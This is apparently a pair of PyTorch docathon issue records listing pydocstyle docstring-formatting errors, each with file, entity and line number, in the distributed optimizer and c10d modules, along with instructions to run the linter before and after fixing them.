- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_OverlapInfo`, **Line**: 186, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_OverlapInfo`, **Line**: 186, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `wait_for_broadcasts`, **Line**: 253, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `wait_for_broadcasts`, **Line**: 253, **Description**: First line should end with a period (not 'l')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `wait_for_broadcasts`, **Line**: 253, **Description**: First line should be in imperative mood (perhaps 'Wait', not 'Waits')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `clear_per_iter_info`, **Line**: 266, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `clear_per_iter_info`, **Line**: 266, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `clear_per_iter_info`, **Line**: 266, **Description**: First line should be in imperative mood (perhaps 'Clear', not 'Clears')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `ZeroRedundancyOptimizer`, **Line**: 276, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `ZeroRedundancyOptimizer`, **Line**: 276, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_clear_cache`, **Line**: 442, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_clear_cache`, **Line**: 442, **Description**: First line should be in imperative mood (perhaps 'Clear', not 'Clears')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `consolidate_state_dict`, **Line**: 499, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `consolidate_state_dict`, **Line**: 499, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_verify_params_per_rank`, **Line**: 584, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_verify_params_per_rank`, **Line**: 584, **Description**: First line should end with a period (not ',')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_verify_params_per_rank`, **Line**: 584, **Description**: First line should be in imperative mood (perhaps 'Verify', not 'Verifies')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_partition_param_group`, **Line**: 616, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_partition_param_group`, **Line**: 616, **Description**: First line should end with a period (not 'o')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_param_to_rank`, **Line**: 709, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_param_to_rank`, **Line**: 709, **Description**: First line should end with a period (not 'k')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_param_to_index`, **Line**: 722, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_param_to_index`, **Line**: 722, **Description**: First line should end with a period (not 'l')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_index_to_param`, **Line**: 738, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_index_to_param`, **Line**: 738, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_broadcast_params_from_rank`, **Line**: 749, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_broadcast_params_from_rank`, **Line**: 749, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_sync_params`, **Line**: 798, **Description**: First line should be in imperative mood (perhaps 'Sync', not 'Syncs')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_device_to_params_per_rank`, **Line**: 816, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_device_to_params_per_rank`, **Line**: 816, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_min_index`, **Line**: 859, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_min_index`, **Line**: 859, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_min_index`, **Line**: 859, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_assign_bucket_subset_to_rank`, **Line**: 887, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_assign_bucket_subset_to_rank`, **Line**: 887, **Description**: First line should end with a period (not 'a')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_assign_bucket_subset_to_rank`, **Line**: 887, **Description**: First line should be in imperative mood (perhaps 'Assign', not 'Assigns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_bucket_assignments_per_rank`, **Line**: 921, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_bucket_assignments_per_rank`, **Line**: 921, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_local_step`, **Line**: 1018, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_local_step`, **Line**: 1018, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_local_step`, **Line**: 1018, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `step`, **Line**: 1092, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `join_hook`, **Line**: 1119, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `join_hook`, **Line**: 1119, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `join_hook`, **Line**: 1119, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `load_state_dict`, **Line**: 1145, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `load_state_dict`, **Line**: 1145, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `state_dict`, **Line**: 1184, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_sync_param_groups`, **Line**: 1252, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_sync_param_groups`, **Line**: 1252, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_sync_param_groups`, **Line**: 1252, **Description**: First line should be in imperative mood (perhaps 'Sync', not 'Syncs')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_build_param_buckets`, **Line**: 1275, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_build_param_buckets`, **Line**: 1275, **Description**: First line should end with a period (not 'o')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_build_param_buckets`, **Line**: 1275, **Description**: First line should be in imperative mood (perhaps 'Build', not 'Builds')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_build_ddp_param_buckets`, **Line**: 1335, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_build_ddp_param_buckets`, **Line**: 1335, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_verify_and_init_params`, **Line**: 1377, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_verify_and_init_params`, **Line**: 1377, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_verify_and_init_params`, **Line**: 1377, **Description**: First line should be in imperative mood (perhaps 'Verify', not 'Verifies')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_verify_same_dense_param_type`, **Line**: 1434, **Description**: First line should be in imperative mood (perhaps 'Verify', not 'Verifies')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_is_trainable_mask`, **Line**: 1465, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_is_trainable_mask`, **Line**: 1465, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_is_trainable_mask`, **Line**: 1465, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_init_local_optimizer`, **Line**: 1472, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_init_local_optimizer`, **Line**: 1472, **Description**: First line should end with a period (not 'f')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_init_local_optimizer`, **Line**: 1472, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_init_zero_for_overlap`, **Line**: 1546, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_init_zero_for_overlap`, **Line**: 1546, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_init_zero_for_overlap`, **Line**: 1546, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_assigned_rank`, **Line**: 1561, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_assigned_rank`, **Line**: 1561, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_assigned_rank`, **Line**: 1561, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_check_overlap_initialized`, **Line**: 1577, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_check_overlap_initialized`, **Line**: 1577, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_check_overlap_initialized`, **Line**: 1577, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_optimizer_constructor`, **Line**: 1598, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_optimizer_constructor`, **Line**: 1598, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_optimizer_constructor`, **Line**: 1598, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_optimizer_constructor`, **Line**: 1598, **Description**: No blank lines allowed between a section header and its content ('Returns')

cc @carljparker",False
Fix docstring errors in distributed_c10d.py module: docs triaged medium docathon-h2-2023,"Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `Backend`, **Line**: 148, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `Backend`, **Line**: 148, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `register_backend`, **Line**: 195, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_reduce_op`, **Line**: 324, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_reduce_op`, **Line**: 324, **Description**: First line should end with a period (not ',')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_World`, **Line**: 416, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_World`, **Line**: 416, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `default_pg`, **Line**: 430, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `pg_map`, **Line**: 442, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `pg_map`, **Line**: 442, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `pg_group_ranks`, **Line**: 464, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `pg_group_ranks`, **Line**: 464, **Description**: First line should end with a period (not 'g')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `pg_backend_config`, **Line**: 473, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `pg_backend_config`, **Line**: 473, **Description**: First line should end with a period (not 'g')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `group_count`, **Line**: 492, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_WorldMeta`, **Line**: 520, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_WorldMeta`, **Line**: 520, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_WorldMeta`, **Line**: 520, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_pg_default_device`, **Line**: 546, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_pg_default_device`, **Line**: 546, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_store_based_barrier`, **Line**: 614, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_store_based_barrier`, **Line**: 614, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_rank_not_in_group`, **Line**: 661, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_rank_not_in_group`, **Line**: 661, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_global_rank`, **Line**: 728, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_global_rank`, **Line**: 728, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_group_size`, **Line**: 751, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_group_size`, **Line**: 751, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_single_tensor`, **Line**: 761, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_single_tensor`, **Line**: 761, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_tensor_list`, **Line**: 772, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_tensor_list`, **Line**: 772, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_op`, **Line**: 805, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_op`, **Line**: 805, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_p2p_op_list`, **Line**: 817, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_p2p_op_list`, **Line**: 817, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_p2p_op_list`, **Line**: 817, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_mpi_available`, **Line**: 835, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_mpi_available`, **Line**: 835, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_nccl_available`, **Line**: 842, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_nccl_available`, **Line**: 842, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_gloo_available`, **Line**: 849, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_gloo_available`, **Line**: 849, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_ucc_available`, **Line**: 856, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_ucc_available`, **Line**: 856, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_backend_available`, **Line**: 863, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_backend_available`, **Line**: 863, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_backend_available`, **Line**: 863, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_initialized`, **Line**: 881, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_initialized`, **Line**: 881, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_initialized`, **Line**: 881, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checking')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_torchelastic_launched`, **Line**: 888, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_torchelastic_launched`, **Line**: 888, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_torchelastic_launched`, **Line**: 888, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_default_group`, **Line**: 908, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_default_group`, **Line**: 908, **Description**: First line should end with a period (not 'p')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_default_group`, **Line**: 908, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Getting')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_default_store`, **Line**: 920, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_default_store`, **Line**: 920, **Description**: First line should end with a period (not 'p')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_default_store`, **Line**: 920, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Getting')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `get_backend`, **Line**: 948, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `init_process_group`, **Line**: 983, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `init_process_group`, **Line**: 983, **Description**: First line should end with a period (not 'o')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `init_process_group`, **Line**: 983, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `destroy_process_group`, **Line**: 1341, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `get_rank`, **Line**: 1410, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `get_rank`, **Line**: 1410, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `get_rank`, **Line**: 1410, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `get_world_size`, **Line**: 1438, **Description**: First line should end with a period (not 'p')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `get_world_size`, **Line**: 1438, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `isend`, **Line**: 1457, **Description**: First line should be in imperative mood (perhaps 'Send', not 'Sends')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `send`, **Line**: 1533, **Description**: First line should be in imperative mood (perhaps 'Send', not 'Sends')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_coalescing_manager`, **Line**: 1633, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `broadcast_multigpu`, **Line**: 1777, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `broadcast_multigpu`, **Line**: 1777, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_reduce_multigpu`, **Line**: 1879, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_reduce_multigpu`, **Line**: 1879, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_reduce`, **Line**: 1940, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_reduce`, **Line**: 1940, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_reduce_coalesced`, **Line**: 2020, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `reduce_multigpu`, **Line**: 2085, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `reduce_multigpu`, **Line**: 2085, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_gather_multigpu`, **Line**: 2192, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_gather_object`, **Line**: 2284, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_gather_object`, **Line**: 2284, **Description**: First line should end with a period (not 'o')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `gather_object`, **Line**: 2376, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `broadcast_object_list`, **Line**: 2486, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `broadcast_object_list`, **Line**: 2486, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `scatter_object_list`, **Line**: 2593, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `scatter_object_list`, **Line**: 2593, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `reduce_scatter_multigpu`, **Line**: 3146, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `reduce_scatter_multigpu`, **Line**: 3146, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_to_all_single`, **Line**: 3376, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_to_all_single`, **Line**: 3376, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_to_all`, **Line**: 3500, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_to_all`, **Line**: 3500, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `barrier`, **Line**: 3620, **Description**: No blank lines allowed before function docstring (found 1)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `barrier`, **Line**: 3620, **Description**: First line should be in imperative mood (perhaps 'Synchronize', not 'Synchronizes')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `monitored_barrier`, **Line**: 3663, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `monitored_barrier`, **Line**: 3663, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `monitored_barrier`, **Line**: 3663, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `monitored_barrier`, **Line**: 3663, **Description**: First line should be in imperative mood (perhaps 'Synchronize', not 'Synchronizes')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `new_group`, **Line**: 3766, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_new_group_with_tag`, **Line**: 3847, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `new_subgroups`, **Line**: 3951, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `new_subgroups`, **Line**: 3951, **Description**: First line should end with a period (not ',')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `new_subgroups`, **Line**: 3951, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `new_subgroups_by_enumeration`, **Line**: 4082, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `new_subgroups_by_enumeration`, **Line**: 4082, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `new_subgroups_by_enumeration`, **Line**: 4082, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_group_tag`, **Line**: 4222, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_group_tag`, **Line**: 4222, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')

cc @carljparker",False
